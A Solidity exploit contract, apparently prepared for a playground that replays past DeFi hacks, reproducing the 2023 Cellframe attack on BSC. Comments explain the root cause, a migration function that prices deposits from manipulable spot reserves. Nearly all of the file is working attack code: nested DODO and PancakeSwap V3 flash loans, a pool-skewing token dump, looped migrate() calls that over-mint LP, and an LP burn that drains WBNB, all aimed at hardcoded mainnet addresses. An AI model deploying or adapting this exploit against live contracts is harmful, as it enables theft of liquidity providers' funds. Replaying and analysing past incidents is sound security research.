// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-06-Cellframe).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// `ContractTest` (`attacker = address(this)`; the DODO flash-loan callback
// `DPPFlashLoanCall` and the PancakeSwap V3 flash callback `pancakeV3FlashCallback`
// both live on the test itself, so there is no standalone contract to deploy).
// This contract is a faithful, self-contained copy of that inline attack so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/Cellframe_exp.sol (preparation phase + both callbacks +
// the two swap helpers), with `address(this)` (the test) replaced by
// `address(this)` (this contract) and `testExploit()` renamed to `run()`.
//
// Root cause: LpMigration.migrate() unwinds the caller's OLD CELL/WBNB LP, then
// sizes the NEW CELL/WBNB side of a fresh addLiquidity() deposit using the NEW
// pool's *live spot reserves* (`resoult = cell/eth`; `token1 = resoult * token0`),
// with amountAMin/amountBMin both 0 and the freshly minted LP sent straight to
// msg.sender. Because the new pool's reserves are trivially manipulable inside
// one transaction (a flash-loan-funded sell of new CELL collapses the WBNB side
// and inflates the CELL side), the attacker inflates `resoult` first, then calls
// migrate() repeatedly to mint grossly over-sized LP for almost no WBNB, and
// finally burns that LP to redeem the pool's real WBNB reserve.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function decimals() external view returns (uint256);
}

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IRouterV2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
}

interface IPancakePairLP {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
}

interface ILpMigration {
    function migrate(uint256 amountLP) external;
}

interface IRouterV3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams memory params) external payable returns (uint256 amountOut);
}

contract CellframeExploit {
    IDPPOracle constant DPPOracle = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IPancakeV3Pool constant PancakePool = IPancakeV3Pool(0xA2C1e0237bF4B58bC9808A579715dF57522F41b2);
    IRouterV2 constant Router = IRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IPancakePairLP constant CELL9 = IPancakePairLP(0x06155034f71811fe0D6568eA8bdF6EC12d04Bed2);
    IPancakePairLP constant PancakeLP = IPancakePairLP(0x1c15f4E3fd885a34660829aE692918b4b9C1803d);
    ILpMigration constant LpMigration = ILpMigration(0xB4E47c13dB187D54839cd1E08422Af57E5348fc1);
    IRouterV3 constant SmartRouter = IRouterV3(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4);
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 constant oldCELL = IERC20(0xf3E1449DDB6b218dA2C9463D4594CEccC8934346);
    IERC20 constant newCELL = IERC20(0xd98438889Ae7364c7E2A3540547Fad042FB24642);
    IERC20 constant BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

    function run() external {
        // === Preparation. Pre-attack transaction ===
        // Establishes the attacker's OLD CELL/WBNB LP position (CELL9), which
        // migrate() will unwind on each of the 9 loop calls below. This is real
        // setup work, not incidental: without holding CELL9 LP, migrate() reverts
        // at migrateLP()'s transferFrom.
        WBNB.approve(address(Router), type(uint256).max);
        swapTokens(address(WBNB), address(oldCELL), WBNB.balanceOf(address(this)));

        oldCELL.approve(address(Router), type(uint256).max);
        swapTokens(address(oldCELL), address(WBNB), oldCELL.balanceOf(address(this)) / 2);

        Router.addLiquidity(
            address(oldCELL),
            address(WBNB),
            oldCELL.balanceOf(address(this)),
            WBNB.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp + 100
        );

        // === End of preparation. Attack start ===
        DPPOracle.flashLoan(1000 * 1e18, 0, address(this), new bytes(1));
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data)
        external
    {
        // Nested flash: borrow 500,000 new CELL from the PancakeSwap V3 pool,
        // triggering pancakeV3FlashCallback below.
        PancakePool.flash(
            address(this), 0, 500_000 * 1e18, hex"0000000000000000000000000000000000000000000069e10de76676d0800000"
        );

        newCELL.approve(address(SmartRouter), type(uint256).max);
        smartRouterSwap();

        swapTokens(address(newCELL), address(WBNB), 94_191_714_329_478_648_796_861);
        swapTokens(address(newCELL), address(BUSD), newCELL.balanceOf(address(this)));

        BUSD.approve(address(Router), type(uint256).max);
        swapTokens(address(BUSD), address(WBNB), BUSD.balanceOf(address(this)));

        // Repay DODO WBNB flash-loan.
        WBNB.transfer(address(DPPOracle), 1000 * 1e18);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        newCELL.approve(address(Router), type(uint256).max);
        CELL9.approve(address(LpMigration), type(uint256).max);

        // Skew the NEW CELL/WBNB pool: dump 500,000 new CELL into it, collapsing
        // its WBNB reserve and inflating cell/eth (the ratio LpMigration.migrate()
        // will read as if it were a trustworthy price).
        swapTokens(address(newCELL), address(WBNB), 500_000 * 1e18);
        // Acquiring oldCELL tokens (extra WBNB -> oldCELL, feeds migrateLP's
        // removeLiquidity leftovers into more attacker-held oldCELL).
        swapTokens(address(WBNB), address(oldCELL), 900 * 1e18);

        // Liquidity amount to migrate (for one call to migrate() func).
        uint256 lpAmount = CELL9.balanceOf(address(this)) / 10;

        // 8 calls to migrate() succeeded on-chain; the 9th reverted (LP
        // exhausted). Loop i < 9 to match the original attack tx faithfully —
        // the 9th call's revert is caught by nothing in the real attack, but a
        // Foundry `call` here would abort the whole tx, so mirror the original
        // author's loop bound exactly (external call reverts propagate up).
        for (uint256 i; i < 9; ++i) {
            LpMigration.migrate(lpAmount);
        }

        // Burn the over-minted LP to redeem the new pool's real WBNB reserve.
        PancakeLP.transfer(address(PancakeLP), PancakeLP.balanceOf(address(this)));
        PancakeLP.burn(address(this));

        swapTokens(address(WBNB), address(newCELL), WBNB.balanceOf(address(this)));
        swapTokens(address(oldCELL), address(WBNB), oldCELL.balanceOf(address(this)));

        // Repay PancakeSwap V3 new-CELL flash-loan (principal + fee).
        newCELL.transfer(address(PancakePool), 500_000 * 1e18 + fee1);
    }

    // Helper function for swap tokens with the use Pancake RouterV2
    function swapTokens(address from, address to, uint256 amountIn) internal {
        address[] memory path = new address[](2);
        path[0] = from;
        path[1] = to;
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, address(this), block.timestamp + 100
        );
    }

    // Helper function for swap tokens with the use Pancake RouterV3
    function smartRouterSwap() internal {
        IRouterV3.ExactInputSingleParams memory params = IRouterV3.ExactInputSingleParams({
            tokenIn: address(newCELL),
            tokenOut: address(WBNB),
            fee: 500,
            recipient: address(this),
            amountIn: 768_165_437_250_117_135_819_067,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        SmartRouter.exactInputSingle(params);
    }

    receive() external payable {}
}
